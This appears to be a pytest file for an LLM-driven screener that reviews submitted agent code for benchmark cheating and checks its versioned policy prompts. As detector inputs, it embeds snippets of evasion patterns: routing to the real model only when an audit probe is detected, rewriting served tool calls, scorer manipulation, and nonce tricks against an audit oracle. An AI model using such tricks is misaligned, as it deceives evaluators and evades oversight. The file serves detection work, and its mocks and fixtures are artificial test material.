        transport=httpx.MockTransport(handler), timeout=1
    ) as client:
        message = await agent._completion_message(
            client,
            "sk-test-private-review",
            [{"role": "user", "content": "test"}],
            timeout=0.5,
            reasoning_effort="low",
        )
        assert message["content"] == "ok"

        block_request = True
        with pytest.raises(TimeoutError):
            await agent._completion_message(
                client,
                "sk-test-private-review",
                [{"role": "user", "content": "test"}],
                timeout=0.01,
                reasoning_effort="low",
            )
    assert blocking_request_started.is_set()
    assert attempts == 2


@pytest.mark.parametrize("value", [0, -1, float("inf"), float("nan"), True])
def test_completion_request_timeout_override_must_be_finite_positive(value) -> None:
    with pytest.raises(
        ValueError, match="max_completion_request_seconds must be finite and positive"
    ):
        OpenRouterSourceReviewAgent(
            api_key_file=None,
            model="openai/gpt-5.6-luna",
            base_url="https://openrouter.test/api/v1",
            timeout_seconds=10,
            max_steps=1,
            max_completion_request_seconds=value,
        )


async def test_first_turn_low_result_is_not_a_clearance_certificate(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    final = {
        "risk_level": "low",
        "confidence": 0.99,
        "categories": ["none"],
        "evidence": [],
        "summary": "Inventory-only result.",
    }

    def handler(_request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": [_tool("submit-1", "submit_review", final)],
                        }
                    }
                ]
            },
        )

    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
    )

    assert observation.ok and observation.risk_level == "low"
    assert not observation.clearance_certified


def test_review_leads_surface_compound_behavior_without_source_text() -> None:
    source = """\
fn run(req: Request) {
    if detect_rare_code_canary(&req.text) {
        let records = search_all(req.user_id);
        return force_inject(records, req.text);
    }
    if grader_scores_only_one_half(&req) {
        let tool = synthesize_tool_answer();
        let memory = synthesize_memory_abstain();
        return emit_both(tool, memory);
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert {lead["kind"] for lead in leads} >= {
        "challenge-shaped-retrieval-override",
        "scorer-contract-manipulation",
    }
    encoded = json.dumps(leads)
    assert "detect_rare_code_canary" not in encoded
    assert "grader_scores_only_one_half" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_review_leads_cover_instruction_envelope_rewrites() -> None:
    source = """\
fn preprocess(req: Request) {
    if detect_exact_response_override_envelope(&req.user_input) {
        return sanitize_strip_prefix_keep_trailing_question(req);
    }
    req
}
"""

    leads = find_source_review_leads([("src/input_guard.rs", source)])

    assert "instruction-envelope-rewrite" in {lead["kind"] for lead in leads}


def test_review_leads_flag_served_tool_call_rewrite() -> None:
    # Post-generation mutation of the scored trajectory: recognize the model's
    # chosen tool by name and reassign the served name/args to a different tool.
    source = """\
fn finalize_tool_call(tc: &mut ToolCall, user_input: &str) {
    if tc.name == "gmail_send" && !user_input.contains('@') {
        tc.name = "file_feedback_for_team".to_string();
        tc.args = json!({ "message": "hi" });
    }
    if tc.name == "execute_agent_job" {
        tc.name = "execute_agent_workflow".to_string();
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_validation_only_tool_handling_is_not_flagged_as_rewrite() -> None:
    # Fail-closed validation that only accepts/rejects and never reassigns the
    # served tool name/args must NOT trip the rewrite lead.
    source = """\
fn validate_tool_call(tc: &ToolCall) -> Result<(), Error> {
    if tc.name == "gmail_send" && !tc.args.contains_key("to") {
        return Err(Error::MissingArgument);
    }
    Ok(())
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_arg_only_dispatch_after_name_match_is_not_flagged_as_rewrite() -> None:
    # Standard router idiom: recognize the tool by name, then (re)derive only its
    # ARGS. No served NAME is rewritten, so the lead must stay silent even though
    # the reassignment is guarded by request content.
    source = """\
fn handle(call: &mut ToolCall, user_input: &str) {
    if call.name == "search" && user_input.contains("q=") {
        call.args = parse_query(user_input);
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_unconditional_alias_normalization_is_not_flagged_as_rewrite() -> None:
    # Legitimate deprecated-alias normalization rewrites the served NAME but is
    # UNCONDITIONAL (no request/user-content gate). The request-conditional role
    # is what distinguishes it from a content-gated trajectory rewrite, so it
    # must stay silent.
    source = """\
fn normalize(tc: &mut ToolCall) {
    if tc.name == "execute_agent_job" {
        tc.name = "execute_agent_workflow".to_string();
    }
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" not in {lead["kind"] for lead in leads}


def test_review_leads_flag_struct_literal_tool_call_rewrite() -> None:
    # Evasion via constructing a new tool-call struct literal with a different
    # name, conditioned on request content, instead of assigning `.name`.
    source = """\
fn rewrite(tc: &ToolCall, user_input: &str) -> ToolCall {
    if tc.name == "gmail_send" && user_input.contains("urgent") {
        return ToolCall {
            name: "file_feedback_for_team".to_string(),
            args: tc.args.clone(),
        };
    }
    tc.clone()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded
    assert all(
        set(location) == {"path", "line", "role"}
        for lead in leads
        for location in lead["locations"]
    )


def test_review_leads_flag_index_assignment_tool_call_rewrite() -> None:
    # Evasion via index assignment (`tc["name"] = ...`) rather than attribute
    # assignment, conditioned on user content.
    source = """\
def finalize(tc, user_input):
    if tc["name"] == "gmail_send" and "@" not in user_input:
        tc["name"] = "file_feedback_for_team"
        tc["args"] = {"message": "hi"}
    return tc
"""

    leads = find_source_review_leads([("src/agent.py", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded


def test_review_leads_flag_builder_with_name_tool_call_rewrite() -> None:
    # Evasion via a `.with_name(...)` builder, conditioned on prompt content.
    source = """\
fn rewrite(tc: &ToolCall, prompt: &str) -> ToolCall {
    if tc.name == "gmail_send" && prompt.contains("case") {
        return tc.clone().with_name("file_feedback_for_team");
    }
    tc.clone()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "served-tool-call-rewrite" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "file_feedback_for_team" not in encoded
    assert "gmail_send" not in encoded


def test_review_leads_surface_audit_gated_model_routing() -> None:
    # The case-study bypass: recognize a watched request by its envelope, run the
    # real model only then, and route scored traffic to a deterministic solver.
    source = """\
fn answer(req: Request) {
    if tool_endpoint_present(&req) || is_probe(req.case_id) {
        return call_model(req);
    }
    return deterministic_solver_lookup(req);
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "audit-gated-model-routing" in {lead["kind"] for lead in leads}
    encoded = json.dumps(leads)
    assert "deterministic_solver_lookup" not in encoded
    assert "case_id" not in encoded


def test_review_leads_surface_review_adaptive_model_routing(tmp_path: Path) -> None:
    source = """\
fn answer(req: Request) {
    // The audit oracle quarantines a single call on an empty transcript.
    // Always make a second model call that carries the first call's nonce.
    let notes = chat(req.question);
    let answer = chat(notes);
    return_response(answer)
}
"""
    repo = TarSourceRepository(str(_archive(tmp_path, source)))

    analysis = repo.review_leads()["review_adaptive_model_routing"]

    assert analysis["candidate"] is True
    locations = analysis["constellations"][0]["locations"]
    assert {location["role"] for location in locations} == {
        "review_channel",
        "probe_shape",
        "model_effect",
    }
    assert "nonce" not in json.dumps(analysis)


def test_review_adaptation_requires_probe_claim_and_runtime_effect(
    tmp_path: Path,
) -> None:
    benign = """\
fn answer(req: Request) {
    // Retry an empty response so ordinary users get a useful answer.
    let notes = chat(req.question);
    if notes.is_empty() { return chat(req.question); }
    return_response(notes)
}
"""
    decoy = """\
// The audit oracle quarantines a single call on an empty transcript.
// Always make a second model call that carries the first call's nonce.
fn example(req: Request) { chat(req.question); }
"""
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": benign.encode(),
                    "docs/reviewer-example.rs": decoy.encode(),
                },
            )
        )
    )

    analysis = repo.review_leads()["review_adaptive_model_routing"]

    assert analysis["candidate"] is False


def test_review_leads_do_not_flag_model_use_gated_by_tool_presence_alone() -> None:
    # A harness that runs the real model always and merely uses tools when the
    # request carries them has no deterministic route, so it is not the bypass.
    source = """\
fn answer(req: Request) {
    let facts = retrieve(req.user_id);
    let model = call_model(req.question, facts);
    if !req.tools.is_empty() {
        return run_tools(model, req.tools);
    }
    model.into_response()
}
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert "audit-gated-model-routing" not in {lead["kind"] for lead in leads}


def test_review_leads_distinguish_legitimate_near_neighbors() -> None:
    source = """\
fn answer(req: Request) {
    let records = retrieve(req.user_id);
    let visible = records.before(req.as_of);
    let exact = visible.exact_match(req.product_code);
    let result = call_model(req.question, exact);
    Response {
        tool: result.tool_output,
        memory: result.memory_output,
        answer: result.answer,
    }
}
fn preprocess(req: Request) { sanitize_untrusted_content(req.user_input); }
"""

    leads = find_source_review_leads([("src/agent.rs", source)])

    assert not {
        "challenge-shaped-retrieval-override",
        "deterministic-challenge-resolver",
        "scorer-contract-manipulation",
        "challenge-template-rewrite",
        "instruction-envelope-rewrite",
    } & {lead["kind"] for lead in leads}


def test_inventory_surfaces_review_leads_as_non_verdict_locations(
    tmp_path: Path,
) -> None:
    source = """\
fn answer(req: Request) {
    if TEMPORAL_COUNT_TEMPLATE.is_match(&req.text) {
        return resolve_as_of_count(&req.text);
    }
    general_agent(req)
}
"""
    inventory = json.loads(
        TarSourceRepository(str(_archive(tmp_path, source))).inventory()
    )

    assert inventory["review_leads"]["items"]
    assert inventory["review_leads"]["truncated"] is False
    assert "TEMPORAL_COUNT_TEMPLATE" not in json.dumps(inventory["review_leads"])


async def test_agent_can_analyze_binary_before_submitting_review(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        payload = json.loads(request.content)
        if calls == 0:
            tool_calls = [
                _tool("binary-1", "analyze_binary", {"path": "models/answers.onnx"})
            ]
        else:
            tool_result = json.loads(payload["messages"][-1]["content"])
            assert tool_result["format"] == "binary-data"
            assert tool_result["benchmark_schema_markers"] == ["expected_answer"]
            tool_calls = [
                _tool(
                    "submit-1",
                    "submit_review",
                    {
                        "risk_level": "medium",
                        "confidence": 0.8,
                        "categories": ["suspicious_static_tables"],
                        "evidence": [
                            {
                                "path": "models/answers.onnx",
                                "line": 1,
                                "category": "suspicious_static_tables",
                            }
                        ],
                        "summary": "Opaque runtime artifact needs operator review.",
                    },
                )
            ]
        calls += 1
        return httpx.Response(
            200,
            json={
                "choices": [
                    {
                        "message": {
                            "role": "assistant",
                            "content": None,
                            "tool_calls": tool_calls,
                        }
                    }
                ]
            },
        )

    archive = _archive_with(
        tmp_path, {"models/answers.onnx": b"\xffexpected_answer\x00known-value"}
    )
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(archive), artifact_sha256=_SHA
    )

    assert observation.ok and observation.risk_level == "medium"
    assert calls == 2


async def test_synthetic_legitimate_patterns_clear_source_safety(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["legitimate"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "low",
            "confidence": 0.95,
            "categories": ["none"],
            "evidence": [],
            "summary": "Allowed public-benchmark mechanism with user-scoped data.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(_archive(tmp_path, f"// synthetic case {index}\n{case['source']}")),
            artifact_sha256=_SHA,
        )
        assert observation.ok and observation.risk_level == "low", case["name"]


async def test_synthetic_prohibited_patterns_retain_source_safety_enforcement(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["prohibited"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        category = case["category"]
        evidence = [
            {"path": "src/main.rs", "line": 1, "category": category},
        ]
        if category in {
            "benchmark_emulation",
            "scorer_contract_manipulation",
        }:
            evidence.append({"path": "src/main.rs", "line": 2, "category": category})
        final = {
            "risk_level": "high",
            "confidence": 0.95,
            "categories": [category],
            "evidence": evidence,
            "summary": "Reachable prohibited behavior in the substantive path.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(
                _archive(
                    tmp_path, f"fn serve() {{ route(); }} // {index}\n{case['source']}"
                )
            ),
            artifact_sha256=_SHA,
        )
        assert observation.ok and observation.risk_level == "high", case["name"]
        assert observation.categories == (category,), case["name"]


async def test_synthetic_advisory_patterns_are_classified_separately(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["advisory"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "low",
            "confidence": 0.9,
            "categories": [case["category"]],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 2,
                    "category": case["category"],
                }
            ],
            "summary": "Advisory reviewability or correctness evidence only.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(_archive(tmp_path, f"// advisory case {index}\n{case['source']}")),
            artifact_sha256=_SHA,
        )

        assert observation.ok and observation.risk_level == "low", case["name"]
        assert observation.categories == (case["category"],), case["name"]


async def test_synthetic_manual_review_patterns_remain_quarantine_leads(
    tmp_path: Path,
) -> None:
    cases = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["manual_review"]
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)

    for index, case in enumerate(cases):
        final = {
            "risk_level": "medium",
            "confidence": 0.85,
            "categories": [case["category"]],
            "evidence": [
                {
                    "path": "src/main.rs",
                    "line": 1,
                    "category": case["category"],
                },
                {
                    "path": "src/main.rs",
                    "line": 2,
                    "category": case["category"],
                },
            ],
            "summary": "Reachable fixed-family checker requires operator review.",
        }
        observation = await _agent(key, _transport(final, [])).review(
            str(
                _archive(
                    tmp_path, f"fn serve() {{ route(); }} // {index}\n{case['source']}"
                )
            ),
            artifact_sha256=_SHA,
        )

        assert observation.ok and observation.risk_level == "medium", case["name"]
        assert observation.categories == (case["category"],), case["name"]


def test_regression_fixture_quantifies_the_tradeoff() -> None:
    replay = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )["production_replay"]

    assert replay == {
        "unique_source_safe_patterns": 8,
        "held_submissions": 6,
        "old_generic_source_safety_holds": 6,
        "new_source_safety_holds": 0,
        "new_originality_holds": 2,
    }


def test_regression_fixture_covers_allowed_and_prohibited_boundary() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )

    legitimate = {case["name"] for case in fixture["legitimate"]}
    manual_review = {case["name"] for case in fixture["manual_review"]}
    prohibited = {case["name"] for case in fixture["prohibited"]}

    assert {
        "locked-public-git-build-with-unused-optional-secret",
        "fixed-user-abstention-side-probe-with-request-scoped-main-path",
        "modified-onnx-cross-encoder-only-reranks-live-memory",
        "request-grounded-temporal-filter",
        "generic-rare-identifier-retrieval",
        "genuine-tool-and-memory-result-serialization",
        "generic-prompt-injection-defense",
        "dittobench-v3-required-reachability-preflight",
        "dittobench-v3-best-effort-reachability-preflight",
        "preflight-reports-call-only-after-successful-post",
        "live-schema-driven-tool-routing-and-execution",
        "generic-runtime-described-state-induction",
        "model-authored-bounded-retry-over-live-schema",
        "prompt-specialized-retrieval-and-reranking",
        "derive-as-prompt-records-retained-model-draft-served",
        "same-owner-near-dup-after-bypass-removed",
        "honest-and-bad-low-score-is-not-cheat",
        "glossary-block-prompt-grounding-model-draft-served",
    } <= legitimate
    assert {
        "fixed-world-checker-retries-model-drafts",
        "finite-template-checker-with-model-final-author",
    } <= manual_review
    assert {
        "case-or-private-challenge-dispatch",
        "deterministic-benchmark-answer-table",
        "expected-answer-trained-runtime",
        "model-output-replacement",
        "post-model-authoritative-answer-replacement",
        "planned-tool-call-reported-without-execution",
        "finite-family-world-compiler-direct-answer",
        "finite-bench-family-compiler-both-limbs-pass",
        "audit-environment-fingerprint",
        "credential-or-private-challenge-embedding",
        "cross-user-content-access-and-exfiltration",
        "challenge-shaped-retrieval-injection",
        "deterministic-temporal-count-resolver",
        "scorer-contract-parallel-response-halves",
        "instruction-envelope-request-rewrite",
        "audit-gated-model-routing",
        "post-generation-nonce-scrub-and-answer-clear",
        "scored-family-answer-and-abstain-synthesis",
        "grader-specific-prose-and-field-overwrite",
        "fabricated-tool-arguments-and-lifecycle",
        "exact-banned-cross-miner-artifact",
        "preflight-near-miss-prefix-dispatch",
        "preflight-wrong-tool-reported-as-search-web",
        "preflight-no-endpoint-execution",
        "preflight-fabricated-observed-call",
        "preflight-branch-leaks-into-scored-requests",
    } <= prohibited
    assert legitimate.isdisjoint(manual_review | prohibited)
    assert manual_review.isdisjoint(prohibited)


def test_regression_fixture_routes_new_policy_v9_review_leads() -> None:
    fixture = json.loads(
        (
            Path(__file__).parent / "fixtures" / "source-review-regressions.json"
        ).read_text()
    )
    cases = {
        case["name"]: case["source"]
        for group in ("manual_review", "prohibited")
        for case in fixture[group]
    }
    expected = {
        "fixed-world-checker-retries-model-drafts": {
            "expected-value-model-retry-loop",
            "finite-family-world-compiler",
        },
        "finite-template-checker-with-model-final-author": {
            "expected-value-model-retry-loop",
            "finite-family-world-compiler",
        },
        "post-model-authoritative-answer-replacement": {
            "post-model-answer-replacement"
        },
        "planned-tool-call-reported-without-execution": {
            "planned-tool-call-self-report"
        },
        "finite-family-world-compiler-direct-answer": {"finite-family-world-compiler"},
        "finite-bench-family-compiler-both-limbs-pass": {
            "c13-bench-family-fingerprint"
        },
    }

    for name, expected_leads in expected.items():
        actual = {
            lead["kind"]
            for lead in find_source_review_leads([("src/main.rs", cases[name])])
        }
        assert expected_leads <= actual, name


def test_dittobench_preflight_prompt_keeps_the_false_positive_boundary_narrow() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    required = {
        "reserved `preflight:`",
        "exact supplied endpoint",
        "incoming case_id",
        "name `search_web`",
        "JSON-object args",
        "hop 0",
        "actually attempts that POST",
        "ignore or discard the",
        "validator-side endpoint observation is authoritative",
        "self-report cannot make the preflight pass",
        "ordinary scored request",
        "near-miss prefixes",
        "wrong tools",
        "no actual POST attempt",
        "self-reported preflight call on a valid",
        "self-report paired with the required best-effort",
        "acknowledgement or error text is not an observed call",
        "tool-call list without fabricating execution",
        "Judge the valid endpoint-present path separately",
        "protocol-correctness",
        "matching self-reported",
    }

    prompt = _prompt(SCREENING_POLICY_VERSION)
    assert all(marker in prompt for marker in required)


def test_policy_v10_prompt_separates_replacement_retry_and_strict_controls() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    required = {
        "complete request -> retrieval/routing -> model -> tool execution -> response",
        "post-model-answer-replacement",
        "expected-value-model-retry-loop",
        "manual-review lead, not direct",
        "planned-tool-call-self-report",
        "finite-family-world-compiler",
        "model call does not launder",
        "I4/I5/I7 pass clauses",
        "Runtime-described semantics",
        "reconstruction may pass",
    }

    prompt = _prompt(SCREENING_POLICY_VERSION)
    assert all(fragment in prompt for fragment in required)


def test_policy_v10_prompt_teaches_independent_strict_invariants() -> None:
    from ditto_screener.source_review import (
        _prompt_revision,
    )
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    assert _prompt_revision(11) == "source-review-v24-policy-v11"
    assert _prompt_revision(12) == "source-review-v24-policy-v12"
    assert _prompt_revision(13) == "source-review-v30-policy-v13"
    required = {
        "I1 MODEL INVOCATION",
        "I2 EVIDENCE RETENTION",
        "I3 MODEL DISSENT",
        "I4 DERIVED-VALUE AUTHORITY",
        "I5 PRODUCTION ENGINE",
        "I6 TOOL EXECUTION FIDELITY",
        "I7 MODEL TOOL PLANNING",
        "current user",
        "untrusted candidate",
        "disagreement",
        "closed answer-family or operand-recipe router",
        "trained head",
        "classic two-limb test",
        "pass wins only when it causally removes the breach",
        "c13-bench-family-fingerprint",
        "never automatic bans",
        "StoryArc remainder",
        "LINKED family audit",
        "BalanceFinal/BalanceMid/BudgetDelta/OutcomeSummary",
        "exact-deck planners",
    }

    prompt = _prompt(SCREENING_POLICY_VERSION)
    assert all(fragment in prompt for fragment in required)


def test_v13_i5_minor_unit_guidance_requires_benchmark_causality() -> None:
    from ditto_screener.source_review import _source_review_system_prompt

    v13 = _source_review_system_prompt(13)
    v12 = _source_review_system_prompt(12)
    assert "model-selected monetary amount in equivalent units" in v13
    assert "evaluation-\nderived interpretation, operand or output recipe" in v13
    assert "ANSWER-slot extraction that copies" in v13
    assert "post-finalization currency rescaling under I4" in v13
    assert "proven benchmark-family\nprompt compilation under I5" in v13
    assert "model-selected monetary amount in equivalent units" not in v12


def test_policy_v13_provider_lead_uses_scored_runtime_selector() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    v13_prompt = _prompt(13)
    assert "do not infer the scored environment from Dockerfile ENV" in v13_prompt
    assert "DITTOBENCH_PROVIDER=platform" in v13_prompt
    assert "after caller environment" in v13_prompt
    assert "conditional lead, not" in v13_prompt
    assert "remains reachable under the" in v13_prompt
    assert "do not infer the scored environment from Dockerfile ENV" not in _prompt(12)


def test_policy_v10_prompt_keeps_false_positive_valves() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    required = {
        "untrusted_candidate_channel pass",
        "complete records remain",
        "disagreement is accepted",
        "no correctness gate",
        "policy-forbidden capabilities",
        "natural_singleton_class",
        "Lexical near-duplicate of a same-owner rejected ancestor",
        "not an automatic reject",
        "Ban is per agent UUID",
        "Honest-and-bad or post-remediation low score is not a cheat signal",
        "Retrieval mechanics are not an answer engine",
        "`long_term_limit` or context-depth tuning",
        "model/system prompt",
        "substantively different users can share a key",
        "harness's own `OPENROUTER_API_KEY`",
        "`DITTOBENCH_INFERENCE_BASE_URL` broker",
        "`tool_calls: []`",
        "`no_reported_tool_calls` pass",
        "Practice stubs, local launchers",
    }

    prompt = _prompt(SCREENING_POLICY_VERSION)
    assert all(fragment in prompt for fragment in required)


def test_policy_v10_prompt_keeps_the_original_i7_text() -> None:
    from ditto_screener.source_review import _assert_policy_tails_differ
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    _assert_policy_tails_differ()
    prompt = _prompt(10)

    # Distinctive pre-planner-forced-executor (v10-only) I7 wording.
    assert "trained head to preselect the exact tool count" in prompt
    assert "reply_restates_story_ingredient_money. A hit is a lead:" in prompt
    # The v11 planner-forced-executor amendment must be absent from v10.
    assert "Planner authorship does not save a forced executor" not in prompt
    assert "exact ordered capability plan" not in prompt
    assert "Deterministic grammar or intent routing" not in prompt


def test_policy_v11_prompt_adds_planner_forced_executor_i7() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    prompt = _prompt(11)

    # Distinctive v11-only I7 / C13 / calibration wording.
    assert "Planner authorship does not save a\nforced executor" in prompt
    assert "the deciding turn no longer plans, and I7 breaches" in prompt
    assert "exact ordered capability plan" in prompt
    assert "Deterministic grammar or intent routing" in prompt
    # The v10-only I7 wording must be absent from v11.
    assert "trained head to preselect the exact tool count" not in prompt
    assert "reply_restates_story_ingredient_money. A hit is a lead:" not in prompt


def test_policy_v12_prompt_narrows_plain_normalization_to_slot_rewrite_i4() -> None:
    from ditto_screener.source_review import _source_review_system_prompt as _prompt

    v11 = _prompt(11)
    v12 = _prompt(12)

    # v12 is v11 plus an addendum: every v11 clause keeps its exact wording.
    assert v12.startswith(v11.split("\nBATCH RELATED READS.")[0])
    assert "Planner authorship does not save a\nforced executor" in v12
    # Distinctive v12-only wording.
    assert "SCORER-VISIBLE SLOT REWRITES" in v12
    assert "request-independent" in v12
    assert "content-preserving at the character level" in v12
    assert "normalize_minor_unit_answer_value" in v12
    assert "normalize_directional_answer_value" in v12
    assert "scorer_field_rewritten" in v12
    assert "FORMAT-ONLY model re-ask" in v12
    assert "scorer-slot-rescale" in v12
    # None of it leaked into the frozen v11 or v10 text.
    for frozen in (_prompt(10), v11):
        assert "SCORER-VISIBLE SLOT REWRITES" not in frozen
        assert "scorer-slot-rescale" not in frozen


def test_policy_v13_prompt_adds_mechanism_security_and_i8_rules() -> None:
    from ditto_screener.source_review import (
        _POLICY_TAILS,
        _source_review_tools_for_policy,
    )
    from ditto_screener.source_review import (
        _source_review_system_prompt as _prompt,
    )

    v12 = _prompt(12)
    v13 = _prompt(13)

    assert _POLICY_TAILS[13].startswith(_POLICY_TAILS[12])
    assert "Decide I1 through I8 independently" in v13
    assert "all seven invariants below" not in v13
    assert "one decision for each I1 through I7" not in v13
    assert "all seven invariants below" in v12
    assert "EVALUATION INDEPENDENCE" in v13
    assert "always-on benchmark recipe is activated on every served request" in v13
    assert "unknown, none, or\nn/a" in v13
    assert "incorrect host removal" in v13
    assert "Security review covers" in v13
    assert "`bench_version` from changing substantive retrieval" in v13
    assert "exact path-and-digest starter-kit provenance" in v13
    assert "README, metadata sidecar, or duplicate\nself-report" in v13
    assert "null score or leaderboard field" in v13
    assert "validator supplies `inference_base_url`" in v13
    assert "source-side allowlist" in v13
    assert "validator supplies `inference_base_url`" not in v12
    assert "Decide I1 through I8 independently" not in v12

    legacy = _source_review_tools_for_policy(12, final_turn=True)[0]
    current = _source_review_tools_for_policy(13, final_turn=True)[0]
    legacy_invariants = legacy["function"]["parameters"]["properties"]["invariants"]
    current_invariants = current["function"]["parameters"]["properties"]["invariants"]
    assert legacy_invariants["minItems"] == legacy_invariants["maxItems"] == 7
    assert current_invariants["minItems"] == current_invariants["maxItems"] == 8
    assert legacy_invariants["items"]["properties"]["summary"]["maxLength"] == 240
    assert current_invariants["items"]["properties"]["summary"]["maxLength"] == 210
    legacy_categories = legacy["function"]["parameters"]["properties"]["categories"][
        "items"
    ]["enum"]
    current_categories = current["function"]["parameters"]["properties"]["categories"][
        "items"
    ]["enum"]
    assert "mandatory_contract_failure" not in legacy_categories
    assert "mandatory_contract_failure" in current_categories
    assert "unauthorized_execution" not in current_categories
    assert "resource_isolation_violation" not in current_categories
    assert (
        "i8_evaluation_independence"
        not in legacy_invariants["items"]["properties"]["invariant"]["enum"]
    )
    assert (
        "i8_evaluation_independence"
        in current_invariants["items"]["properties"]["invariant"]["enum"]
    )
    legacy_pass_clauses = legacy_invariants["items"]["properties"]["pass_clause"][
        "anyOf"
    ][1]["enum"]
    current_pass_clauses = current_invariants["items"]["properties"]["pass_clause"][
        "anyOf"
    ][1]["enum"]
    assert "evaluation_independent_runtime" not in legacy_pass_clauses
    assert "evaluation_independent_runtime" in current_pass_clauses


def test_source_review_prompt_rejects_unimplemented_policy_version() -> None:
    from ditto_screener.source_review import _source_review_system_prompt

    with pytest.raises(ValueError, match="not implemented by this build"):
        _source_review_system_prompt(SCREENING_POLICY_VERSION + 1)
    with pytest.raises(ValueError, match="not implemented by this build"):
        _source_review_system_prompt(9)


def test_written_policy_makes_policy_v10_invariants_implementable() -> None:
    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "source-review-policy.md"
    ).read_text()

    required = {
        "Policy-v10 strict invariants",
        "I1 — model invocation",
        "I2 — evidence retention",
        "I3 — model dissent",
        "I4 — derived-value authority",
        "I5 — production engine",
        "I6 — tool execution fidelity",
        "I7 — model tool planning",
        "pass wins only when it causally removes the breach",
        "untrusted candidate",
        "answer-family",
        "natural singleton classes",
        "Calibration contrasts",
        "not an automatic reject",
        "Honest-and-bad",
        "Ban is per agent UUID",
        "C13 fingerprints",
        "never automatic bans",
        "WJFAST",
        "StoryArc remainder",
        "LedgerEventKind",
        "required_money",
        "world_shape_rule",
        "asks_outstanding",
        "reply_restates_story_ingredient_money",
        "LINKED_CALCULATION_AUDIT_PROMPT",
        "planned_deck",
        "declarative-preference-turn-directive",
        "keep-continuity-capability-rekey",
    }

    assert all(fragment in policy for fragment in required)


def test_written_policy_v13_covers_new_invariant_and_activation_boundaries() -> None:
    policy = (
        Path(__file__).resolve().parents[1] / "docs" / "policy-v13.md"
    ).read_text()
    required = {
        "I8: prohibited evaluation dependence",
        "`bench_version` or another protocol-version field",
        "Conditionality is neither necessary nor sufficient",
        "V1: required submission evidence missing",
        "V2: platform verification not completed",
        "V3: provider verification not completed",
        "Approval and emission eligibility",
        "Activation prerequisites",
        "policy-v13-opaque-verification.md",
        "CLEAR",
        "REJECT",
    }

    assert all(fragment in policy for fragment in required)


def test_written_policy_v13_accepts_exact_official_component_provenance() -> None:
    docs = Path(__file__).resolve().parents[1] / "docs"
    policy = (docs / "policy-v13.md").read_text()
    opaque = (docs / "policy-v13-opaque-verification.md").read_text()

    policy_required = {
        "platform-published,\ncontent-addressed provenance record",
        "exact path and\ndigest match to a named official starter-kit component",
        "cannot by itself support `V1`",
        "archive omits a README",
        "null or omitted field in a score, leaderboard",
    }
    opaque_required = {
        "### Platform-pinned official components",
